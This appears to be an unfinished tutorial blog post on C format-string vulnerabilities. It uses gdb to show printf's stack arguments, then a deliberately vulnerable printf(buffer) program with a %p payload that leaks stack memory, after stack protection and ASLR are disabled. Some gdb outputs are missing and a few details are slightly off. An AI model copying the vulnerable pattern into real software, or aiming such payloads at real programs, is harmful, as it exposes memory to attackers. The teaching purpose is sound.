TODO: update instructions
To follow this post you may need a modicum of C know-how as well as some familiarity with `gdb`. In regards to compile flags, we're using `-g` to include debugging information (which will be used by `gdb`) and `-m32` to compile to 32 bits (I'm using a 64 bits machine and you probably are too) - but 32 bit is easier to understand. 

I'll also be using the `-fno-stack-protector` option which is enabled by default on modern versions of `gdb` and ASLR (Address Space Layout Reandomisation) has been disabled via `sudo echo 0 | tee /proc/sys/kernel/randomize_va_space`.

Note that I am supressing warnings with the `-w` flag - that's intentional and solely for the purpose of this exercise!

## `printf` calling convention

Let's start by looking at how `printf` is called from an assembly perspective. Here's the `C` code:

~~~ c
#include <stdlib.h>

int
main(int argc, char* argv[])
{
  unsigned int var = 0xAAAAAAAA;
  char buffer[512];
  strcpy(buffer, argv[1]);

  printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
  printf("\n");

  exit(0);
}
~~~

Let's compile that and check the corresponding assembly in `gdb`:

~~~ shell
vagrant@vagrant:~/scratch$ gcc -m32 -g -fno-stack-protector -w printf_c.c
vagrant@vagrant:~/scratch$ gdb -q ./a.out
Reading symbols from ./a.out...done.
(gdb) list 10
5       main(int argc, char* argv[])
6       {
7         unsigned int var = 0xAAAAAAAA;
8         char buffer[512];
9         strcpy(buffer, argv[1]);
10
11        printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
12        printf("\n");
13
14        exit(0);
(gdb) break 11
Breakpoint 1 at 0x80484d3: file printf_c.c, line 11.
(gdb) set disassemble-next-line on
(gdb) run foo
Starting program: /home/vagrant/scratch/a.out foo

Breakpoint 1, main (argc=2, argv=0xffffdc24) at printf_c.c:11
11        printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
=> 0x080484d3 <main+56>:        83 ec 04                sub    esp,0x4
   0x080484d6 <main+59>:        8d 45 f4                lea    eax,[ebp-0xc]

   0x080484da <main+63>:        8d 85 f4 fd ff ff       lea    eax,[ebp-0x20c]
   0x080484e0 <main+69>:        50                      push   eax
   0x080484e1 <main+70>:        68 90 85 04 08          push   0x8048590

   0x080484eb <main+80>:        83 c4 10                add    esp,0x10
~~~ 

We see that we push 3 things on top of the stack before the `call`. Let's see those in more details:

~~~ shell
(gdb) break *0x080484e6
Breakpoint 2 at 0x80484e6: file printf_c.c, line 11.
(gdb) set disassemble-next-line off
(gdb) c
Continuing.

Breakpoint 2, 0x080484e6 in main (argc=2, argv=0xffffdc24) at printf_c.c:11
11        printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
(gdb) x/4wx $esp

(gdb) x/s 0x08048590
0x8048590:      "Caller passed in string %s, var is located at 0x%08x"

(gdb) x/4x 0xffffdb6c

As we can see, we have 3 addresses - each corresponding to an argument given to `printf`. The string to be interpolated is pushed first, and the arguments next.

`printf` takes a variable number of arguments thought. So how does it know what to look for on the stack? It parses the format string.

## Reading arbitrary addresses

As we saw above, `printf` expects all its arguments (determined by the format string) to be on the stack - and when they're passed in properly that works just fine. But sometimes people are forgetfull and end up doing the following:

~~~ c
#include <stdlib.h>
#include <stdio.h>

int
main(int argc, char* argv[])
{
  char buffer[512];
  strcpy(buffer, argv[1]);

  printf(buffer);
  printf("\n");

  exit(0);
}
~~~

Which works as expected *as long as* the caller does not include a format string:

~~~ shell
vagrant@vagrant:~/scratch$ gcc -m32 -g -fno-stack-protector -w printf_c.c
vagrant@vagrant:~/scratch$ ./a.out hello
hello
vagrant@vagrant:~/scratch$ ./a.out hello%08x
helloffb5ad8b
~~~

So what just happened? `printf` parsed the format string and decided it needed an extra argument - and just took the next item on the stack and displayed it as a 4-bytes word. Let's try that again with a more contrived example:

~~~ shell
vagrant@vagrant:~/scratch$ ./a.out DDDD$(perl -e "print '%p..'x12")
DDDD0xffdf3d60..0xf77d8f1c..0xf77cbe7a..0x8..0xf77cbe66..0xf77d9000..0x44444444..0x2e2e7025..0x2e2e7025..0x2e2e7025..0x2e2e7025..0x2e2e7025..
~~~

The `0x44444444` looks suspicious, and so does the repeating `0x2e2e7025`. Sure enough:

~~~ shell
vagrant@vagrant:~/scratch$ printf "\x44\x44\x44\x44\n"
DDDD
vagrant@vagrant:~/scratch$ printf "\x2e\x2e\x70\x25\n"
..p%
~~~

Do remember we're using little-endian, so the bytes are printed backwards. Unlike the first example where the format string was located at `0x08048590`, this time it has been placed fully on the stack! And as we walk down the stack we encounter what we put on.

This unfortunately means we cannot read past our input - but we can trick `printf` into reading a string at a memory location of our choosing.
